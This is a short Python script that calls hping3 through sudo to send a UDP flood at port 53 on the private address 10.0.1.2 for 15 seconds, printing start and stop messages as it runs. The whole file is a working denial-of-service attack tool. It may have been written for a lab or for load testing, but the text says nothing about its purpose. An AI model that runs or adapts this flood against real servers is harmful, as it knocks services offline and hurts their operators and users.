import subprocess
import time

TARGET = "10.0.1.2"
PORT = 53
DURATION = 15

def main():
    print(f"[+] Starting UDP flood against {TARGET}:{PORT}")
    
    process = subprocess.Popen([
        "sudo", "hping3",
        "--udp",
        "-i", 
        "u1000",
        "-p", str(PORT),
        TARGET,
        "-s", "12345",  # fixed source port for consistency
    ])

    try:
        time.sleep(DURATION)
    except KeyboardInterrupt:
        print("\n[-] Interrupted by user.")

    process.terminate()
    print("[+] UDP flood stopped.")

if __name__ == "__main__":
    main()